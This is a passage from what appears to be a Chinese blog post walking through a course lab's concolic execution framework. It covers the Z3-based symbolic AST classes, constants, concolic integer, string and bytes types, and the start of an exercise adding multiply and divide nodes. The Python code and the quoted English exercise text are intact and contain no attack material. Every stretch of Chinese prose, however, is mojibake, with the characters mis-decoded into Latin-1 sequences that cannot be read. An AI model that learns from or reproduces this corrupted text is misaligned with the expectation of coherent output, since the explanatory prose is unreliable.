<code>cur_path_constr</code> åˆ—è¡¨ä¸­ï¼Œä¸ºäº†ç”Ÿæˆèƒ½å¤Ÿæ²¿ç€ä¸€æ¡åˆ†æ”¯ä»ä¸€ä¸ªç‚¹è¿›è¡Œä¸åŒé€‰æ‹©çš„è¾“å…¥ï¼Œæ‰€éœ€çš„çº¦æŸä¸ºè·¯å¾„ä¸Šè¯¥ç‚¹ä¹‹å‰çš„çº¦æŸé›†åˆï¼ŒåŠ ä¸Šè¯¥ç‚¹çš„åå‘çº¦æŸï¼›ä¸ºäº†å¸®åŠ©è°ƒè¯•ä¸å¯å‘å¼æœç´¢ï¼Œè§¦å‘äº†åˆ†æ”¯çš„ä»£ç è¡Œçš„ä¿¡æ¯ä¼šè¢«å­˜æ”¾åœ¨ <code>cur_path_constr_callers</code> åˆ—è¡¨ä¸­</p></li></ul><p>æ¥ä¸‹æ¥æˆ‘ä»¬çš„å·¥ä½œæ˜¯å®Œæˆå¯¹ <code>concolic_int</code> çš„å®ç°ï¼Œå¹¶å°†ä»£ç åº”ç”¨äºæ··åˆæ‰§è¡Œå¾ªç¯çš„æ ¸å¿ƒï¼Œæœ¬ Lab æä¾›äº†ä¸¤ä¸ªæµ‹è¯•ç¨‹åºï¼š <code>check-concolic-int.py</code> ä¸ <code>check-symex-int.py</code></p><h3 id="æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ-Part-1">æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ  - Part 1</h3><p>åœ¨åš Exercise ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹è¿™ä¸ªæ··åˆæ‰§è¡Œæ¡†æ¶çš„ä»£ç ç»“æ„ï¼Œå…¶æ ¸å¿ƒä»£ç ä¸»è¦ä½äº <code>symex/fuzzy.py</code> ä¸­</p><h4 id="I-AST-èŠ‚ç‚¹">I. AST èŠ‚ç‚¹</h4><p>é¦–å…ˆæ˜¯ AST èŠ‚ç‚¹ï¼Œä½œä¸ºæ‰€æœ‰ç¬¦å·ç±»çš„çˆ¶ç±»è€Œå­˜åœ¨ï¼Œå®šä¹‰æ¯”è¾ƒç®€å•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_ast</span>(<span class="hljs-title class_ inherited__">object</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(self._z3expr())<br></code></pre></td></tr></table></figure><h4 id="II-ç¬¦å·è¿ç®—">II. ç¬¦å·è¿ç®—</h4><p>ç„¶åæ˜¯ <code>sym_func_apply</code> ç±»ï¼Œä½œä¸ºæ‰€æœ‰ç¬¦å·æ“ä½œçš„çˆ¶èŠ‚ç‚¹ï¼Œè¿™é‡Œä¸»è¦é‡è½½äº† <code>__eq__()</code> å’Œ <code>__hash__()</code> æ–¹æ³•ï¼Œç”¨äºæ¯”è¾ƒä¸è®¡ç®—å“ˆå¸Œå€¼ï¼Œæ¯”è¾ƒçš„æ–¹æ³•å°±æ˜¯åˆ¤æ–­æ˜¯å¦æ‰€æœ‰å‚æ•°ç›¸ç­‰ï¼Œå“ˆå¸Œå€¼çš„è®¡ç®—åˆ™æ˜¯æ‰€æœ‰å‚æ•°çš„å“ˆå¸Œå€¼è¿›è¡Œå¼‚æˆ–ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_func_apply</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, *args</span>):<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> args:<br>      <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(a, sym_ast):<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Passing a non-AST node %s %s as argument to %s&quot;</span> % \<br>                        (a, <span class="hljs-built_in">type</span>(a), <span class="hljs-built_in">type</span>(self)))<br>    self.args = args<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(self) != <span class="hljs-built_in">type</span>(o):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.args) != <span class="hljs-built_in">len</span>(o.args):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(sa == oa <span class="hljs-keyword">for</span> (sa, oa) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.args, o.args))<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> functools.reduce(operator.xor, [<span class="hljs-built_in">hash</span>(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯ä¸‰ä¸ªç±» <code>sym_unop</code> ã€<code>sym_binop</code> ã€<code>sym_triop</code>ï¼Œè¡¨ç¤ºå¸¦æœ‰1ã€2ã€3ä¸ªæ“ä½œæ•°çš„å°è£…ï¼Œå¯ä»¥ä½¿ç”¨ <code>a</code> ã€<code>b</code> ã€<code>c</code> è·å¾—ç¬¬ 1ã€2ã€3ä¸ªæ“ä½œæ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_unop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a</span>):<br>    <span class="hljs-built_in">super</span>(sym_unop, self).__init__(a)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_binop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a, b</span>):<br>    <span class="hljs-built_in">super</span>(sym_binop, self).__init__(a, b)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_triop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a, b, c</span>):<br>    <span class="hljs-built_in">super</span>(sym_triop, self).__init__(a, b, c)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">1</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">c</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">2</span>]<br></code></pre></td></tr></table></figure><p>åŸºäº <code>sym_func_apply</code> ä¸ <code>op</code> ç±»ï¼Œå°è£…äº†ç›¸ç­‰æ¯”è¾ƒã€ä¸ã€æˆ–ã€éå››ä¸ªæ“ä½œï¼Œå…¶å®ç°åŸç†ä¸»è¦è¿˜æ˜¯è½¬æˆ Z3 è¡¨è¾¾å¼ååˆ©ç”¨ Z3 çš„ä¸æˆ–éè¿›è¡Œè¿ç®—ï¼šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Logic expressions</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_eq</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) == z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_and</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.And(*[z3expr(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_or</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Or(*[z3expr(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_not</span>(<span class="hljs-title class_ inherited__">sym_unop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Not(z3expr(self.a))<br></code></pre></td></tr></table></figure><p>ç¬¦å·æ•°çš„åŠ å‡ä¹˜é™¤æ¯”è¾ƒç­‰æ“ä½œéƒ½æ˜¯åŸºäºä¸Šé¢å°è£…çš„ <code>op</code> ç±»å®Œæˆçš„ï¼š</p><blockquote><p>ä¹˜é™¤ç­‰è¿ç®—éœ€è¦æˆ‘ä»¬åœ¨åç»­çš„ Exercise ä¸­è‡ªè¡Œå®ç°</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_lt</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) &lt; z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_gt</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) &gt; z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_plus</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) + z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_minus</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) - z3expr(self.b)<br></code></pre></td></tr></table></figure><h4 id="III-å¸¸é‡">III. å¸¸é‡</h4><p>å­—ç¬¦ä¸²å¸¸é‡ <code>const_str</code> ã€æ•´å‹å¸¸é‡ <code>const_int</code> ã€å¸ƒå°”å¸¸é‡ <code>const_bool</code> çš„å®ç°æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯ç»§æ‰¿è‡ª <code>sym_ast</code> å¹¶ä¸”å‚¨å­˜å¯¹åº”çš„å€¼ï¼Œå…¶ä¸­å­—ç¬¦ä¸²å¸¸é‡åœ¨è½¬ä¸º Z3 è¡¨è¾¾å¼æ—¶ä¼šè°ƒç”¨ <code>z3.StringVal()</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_str</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, v</span>):<br>    self.v = v<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_str):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.v == o.v<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.v)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.StringVal(self.v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_int</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, i</span>):<br>    self.i = i<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_int):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.i == o.i<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.i)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.i<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_bool</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, b</span>):<br>    self.b = b<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_bool):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.b == o.b<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.b)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.b<br></code></pre></td></tr></table></figure><h4 id="IV-ç¬¦å·å˜é‡">IV. ç¬¦å·å˜é‡</h4><p>åœ¨è¯¥æ¡†æ¶ä¸­å®šä¹‰äº†ä¸¤ç§ç±»å‹çš„ç¬¦å·å˜é‡ï¼š<code>sym_int</code> ä¸ <code>sym_str</code>ï¼Œéƒ½æ˜¯ç›´æ¥åŸºç¡€è‡ª AST èŠ‚ç‚¹ç±»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Arithmetic</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_int</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span></span>):<br>    self.<span class="hljs-built_in">id</span> = <span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, sym_int):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.<span class="hljs-built_in">id</span> == o.<span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.<span class="hljs-built_in">id</span>)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Int(self.<span class="hljs-built_in">id</span>)<br><br><span class="hljs-comment">###...</span><br><br><span class="hljs-comment">## String operations</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_str</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span></span>):<br>    self.<span class="hljs-built_in">id</span> = <span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, sym_str):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.<span class="hljs-built_in">id</span> == o.<span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.<span class="hljs-built_in">id</span>)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Const(self.<span class="hljs-built_in">id</span>, z3.StringSort())<br></code></pre></td></tr></table></figure><h4 id="V-æ··åˆå˜é‡">V. æ··åˆå˜é‡</h4><p>æ­£å¦‚å‰æ–‡æ‰€è¨€ï¼Œæˆ‘ä»¬å®é™…ä¸Šåœ¨æ··åˆæ‰§è¡Œå¼•æ“å½“ä¸­ä½¿ç”¨çš„ä¸ºæ··åˆå‹ï¼ˆconcolicï¼‰çš„å˜é‡æ¥å‚¨å­˜çº¦æŸå€¼ï¼Œæ¡†æ¶ä¸­æä¾›äº†ä¸‰ç§ç±»å‹çš„æ··åˆå˜é‡â€”â€”<code>concolic_int</code> ï¼ˆæ•´å‹ï¼‰ã€ <code>concolic_str</code>ï¼ˆå­—ç¬¦ä¸²ï¼‰ã€<code>concolic_bytes</code>ï¼ˆå­—ç¬¦æ•°ç»„ï¼‰ï¼Œå…¶ä¸­å…·ä½“å€¼ï¼ˆconctre valueï¼‰å­˜æ”¾åœ¨ <code>__v</code> æˆå‘˜ä¸­ï¼Œç¬¦å·å€¼ï¼ˆsymbolic valueï¼‰å­˜æ”¾åœ¨ <code>__sym</code> ä¸­</p><p>ä¸»è¦æ˜¯<strong>å¤§é‡çš„è¿ç®—ç¬¦é‡è½½</strong>ï¼Œè¿™é‡Œå°±ä¸è´´å®Œæ•´ä»£ç äº†ï¼Œå¯ä»¥è‡ªå·±å»çœ‹ï¼ˆç¬‘ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_int</span>(<span class="hljs-title class_ inherited__">int</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    self = <span class="hljs-built_in">super</span>(concolic_int, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">## ...</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_str</span>(<span class="hljs-title class_ inherited__">str</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">str</span><br>    self = <span class="hljs-built_in">super</span>(concolic_str, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">##...</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_bytes</span>(<span class="hljs-title class_ inherited__">bytes</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">bytes</span><br>    self = <span class="hljs-built_in">super</span>(concolic_bytes, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><hr><p>æ¥ä¸‹æ¥æ˜¯ Exercise 2ï¼šé€šè¿‡å¢åŠ æ•´å‹ä¹˜æ³•ä¸é™¤æ³•æ”¯æŒæ¥å®Œæˆå¯¹ <code>symex/fuzzy.py</code> ä¸­ <code>concolic_int</code> çš„å®ç°ï¼Œæˆ‘ä»¬éœ€è¦é‡è½½é¢å¤–çš„æ–¹æ³•å¹¶ä¸ºä¹˜é™¤æ³•è¿ç®—æ·»åŠ  AST èŠ‚ç‚¹ï¼Œå¹¶ä¸ºè¿™äº› AST èŠ‚ç‚¹åº”ç”¨ <code>_z3expr</code></p><blockquote><p><strong>Exercise 2.</strong> Finish the implementation of <code>concolic_int</code> by adding support for integer multiply and divide operations. You will need to overload additional methods in the <code>concolic_int</code> class (see the documentation for <a href="https://docs.python.org/3/library/operator.html">operator functions in Python 3</a>), add AST nodes for multiply and divide operations, and implement <code>_z3expr</code> appropriately for those AST nodes.</p><p>Look for the comments <code>Exercise 2: your code here</code> in <code>symex/fuzzy.py</code> to find places where we think you might need to write code to solve this exercise.</p><p>Run <strong>./check-concolic-int.py</strong> or <strong>make check</strong> to check that your changes to <code>concolic_int</code> work correctly.</p></blockquote><p>æˆ‘ä»¬é¦–å…ˆå®ç°ç¬¦å·å˜é‡ä¹˜é™¤æ‰€éœ€çš„ <code>sym_binop</code> å­ç±»ï¼Œè¿™é‡Œæˆ‘ä»¬å‚ç…§å‰é¢çš„åŠ å‡è¿ç®—ç›´æ¥è°ƒç”¨ <code>z3expr()</code> æ¥è¿”å› Z3 è¡¨è¾¾å¼å³å¯</p><p>éœ€è¦æ³¨æ„çš„æ˜¯è™½ç„¶ python çš„é™¤æ³•è¿ç®—æœ‰ <code>/</code> ä¸ <code>//</code>ä¸¤ç§ï¼Œä½†æ˜¯ Z3å¹¶ä¸æ”¯æŒ <code>ArithRef</code> ä¸ <code>int</code> ç›´æ¥è¿›è¡Œ <code>//</code> è¿ç®—ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åªå®ç°ä¸€ä¸ªæ™®é€šçš„ä¹˜æ³•å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 2: your code here.</span><br><span class="hljs-comment">## Implement AST nodes for division and multiplication.</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_mul</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) * z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_div</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) / z3expr(self.b)<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬é‡å†™ <code>concolic_int</code> çš„ä¹˜æ³•ä¸é™¤æ³•ï¼Œæˆ‘ä»¬å…ˆå‚è€ƒä¸€ä¸‹ <code>concolic_int </code>ä¸­çš„åŠ 